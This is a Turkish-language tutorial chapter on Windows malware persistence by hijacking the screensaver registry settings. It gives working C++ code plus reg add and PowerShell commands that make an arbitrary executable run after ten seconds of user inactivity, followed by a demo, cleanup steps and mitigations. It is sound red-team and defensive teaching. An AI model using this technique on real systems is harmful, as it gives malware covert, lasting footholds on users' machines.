\newpage
\subsection{68. zararlı yazılım geliştirme: kalıcılık - bölüm 2. Screensaver hijack.C++ örneği}

![pers](./images/52/2022-04-27_03-07.png){width="80%"}    

Bu yazı, Windows zararlı yazılım kalıcılık teknikleri ve hileleri üzerine yazı dizisinin ikinci bölümüdür.    

Bugün, kendi araştırmalarımın sonucu olan bir başka kalıcılık hilesi hakkında yazacağım: Screensaver kötüye kullanımı.    

### screensavers

Screensaver'lar, kullanıcı belirli bir süre boyunca hareketsiz kaldığında çalışan programlardır. Windows'un bu özelliği, tehdit aktörleri tarafından kalıcılık sağlamak için kötüye kullanılmaktadır.Screensaver'lar varsayılan olarak `.scr` uzantısına sahip PE dosyalarıdır ve ayarları aşağıdaki registry anahtarlarında saklanmaktadır:    

`HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive`    

![pers](./images/52/2022-04-27_03-23.png){width="80%"}    

Screensaver'ı etkinleştirmek için değeri `1` olarak ayarlayın.    

`HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut` -     
Screensaver'ın çalıştırılmadan önceki kullanıcı hareketsizlik süresini ayarlar.    
`HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE` -     
çalıştırılacak uygulamanın yolunu ayarlar.    

### pratik örnek

Şimdi pratik bir örneğe bakalım. Diyelim ki [önceki](https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html) bölümden elimizde bir "malware" olan `hack.cpp` var:    

```cpp
/*
meow-meow messagebox
author: @cocomelonc
*/
#include <windows.h>

int WINAPI WinMain(HINSTANCE hInstance, 
HINSTANCE hPrevInstance, LPSTR lpCmdLine, 
int nCmdShow) {
  MessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
  return 0;
}
```

Hadi bunu derleyelim:    

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-mwindows -I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
```

![pers](./images/52/2022-04-27_02-04.png){width="80%"}    

Ve bir klasöre kaydedelim `Z:\\2022-04-26-malware-pers-2\`:    

![pers](./images/52/2022-04-27_03-29.png){width="80%"}    

Daha sonra, `pers.cpp` adlı bir betik oluşturalım. Bu betik, `hack.exe` programını kullanıcı `10` saniye boyunca hareketsiz kaldığında çalıştıracak registry anahtarlarını oluşturacaktır:   

```cpp
/*
pers.cpp
windows low level persistense via screensaver
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/04/26/malware-pers-2.html
*/
#include <windows.h>
#include <string.h>

int reg_key_compare(HKEY hKeyRoot, char* lpSubKey, 
char* regVal, char* compare) {
  HKEY hKey = nullptr;
  LONG ret;
  char value[1024];
  DWORD size = sizeof(value);
  ret = RegOpenKeyExA(hKeyRoot, lpSubKey, 0, KEY_READ, &hKey);
  if (ret == ERROR_SUCCESS) {
    RegQueryValueExA(hKey, regVal, NULL, NULL, 
    (LPBYTE)value, &size);
    if (ret == ERROR_SUCCESS) {
      if (strcmp(value, compare) == 0) {
        return TRUE;
      }
    }
  }
  return FALSE;
}

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;
  // malicious app
  const char* exe = "Z:\\2022-04-26-malware-pers-2\\hack.exe";
  // timeout
  const char* ts = "10";
  // activation
  const char* aact = "1";

  // startup
  LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, 
  (LPCSTR)"Control Panel\\Desktop", 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // create new registry keys
    RegSetValueEx(hkey, (LPCSTR)"ScreenSaveActive", 0, 
    REG_SZ, (unsigned char*)aact, strlen(aact));
    RegSetValueEx(hkey, (LPCSTR)"ScreenSaveTimeOut", 0, 
    REG_SZ, (unsigned char*)ts, strlen(ts));
    RegSetValueEx(hkey, (LPCSTR)"SCRNSAVE.EXE", 0, 
    REG_SZ, (unsigned char*)exe, strlen(exe));
    RegCloseKey(hkey);
  }
  return 0;
}
```

Gördüğünüz gibi, mantık oldukça basit. Sadece timeout ve uygulama yolu için yeni registry anahtarları ekliyoruz.     

Registry anahtarları `cmd` terminali üzerinden de eklenebilir:    

```powershell
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /d 10
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE \
/d Z:\2022-04-26-malware-pers-2\hack.exe
```

veya `powershell` komutları ile:    

```powershell
New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' \
-Name 'ScreenSaveTimeOut' -Value '10'
New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' \
-Name 'SCRNSAVE.EXE' -Value \
'Z:\2022-04-26-malware-pers-2\hack.exe'
```

Ancak kod yazmayı sevdiğim için, bunu birkaç satır kod ile nasıl yapabileceğinizi göstermek istedim.     

### demo

Hadi `pers.cpp` betiğimizi derleyelim:     

```bash
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/52/2022-04-27_02-06.png){width="80%"}    

Daha sonra, deneyin doğruluğu için öncelikle kurbanın makinesindeki registry anahtarlarını kontrol edelim ve eğer varsa, anahtarları silelim:    

```powershell
reg query "HKCU\Control Panel\Desktop" /s
Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" \
-Name 'ScreenSaveTimeOut'
Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" \
-Name 'SCRNSAVE.EXE'
```

![pers](./images/52/2022-04-27_03-43.png){width="80%"}    

![pers](./images/52/2022-04-27_03-48.png){width="80%"}    

daha sonra, `pers.exe` betiğimizi çalıştırıp tekrar kontrol edelim:    

```powershell
.\pers.exe
reg query "HKCU\Control Panel\Desktop" /s
```

![pers](./images/52/2022-04-27_04-14.png){width="80%"}    

Gördüğünüz gibi, yeni anahtar beklendiği gibi eklendi.     

Şimdi her şeyi çalışırken kontrol edelim. Oturumu kapatıp tekrar giriş yapalım ve `10` saniye bekleyelim veya sadece `10` saniye boyunca hareketsiz kalalım:     

![pers](./images/52/2022-04-27_04-13_1.png){width="80%"}    

Pwn! Her şey mükemmel şekilde çalıştı! :)   

Deneyin sonunda, anahtarları silmeyi unutmayın:     

```powershell
Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" \
-Name 'ScreenSaveTimeOut'
Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" \
-Name 'SCRNSAVE.EXE'
reg query "HKCU\Control Panel\Desktop" /s
```

![pers](./images/52/2022-04-27_04-18.png){width="80%"}    

### sonuç

Bu kalıcılık yönteminin dezavantajı, kullanıcı geri döndüğünde ve sistem artık boşta olmadığında oturumun sonlanmasıdır. Ancak red team'ler, kullanıcının yokluğunda (örneğin, bir coin miner çalıştırarak) operasyonlarını gerçekleştirebilirler.
Eğer screensaver'lar grup politikası ile devre dışı bırakılmışsa, bu yöntem kalıcılık için kullanılamaz. Ayrıca, `.scr` dosyalarının standart olmayan konumlardan çalıştırılmasını engelleyerek bu tekniği önleyebilirsiniz.    

[This trick in MITRE ATT&CK](https://attack.mitre.org/techniques/T1546/002/)    
[RegOpenKeyEx](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa)    
[RegSetValueEx](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa)    
[RegCloseKey](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey)    
[Remove-ItemProperty](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/remove-itemproperty?view=powershell-7.2)    
[reg query](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query)    
[github'taki kaynak kod](https://github.com/cocomelonc/2022-04-26-malware-pers-2)    
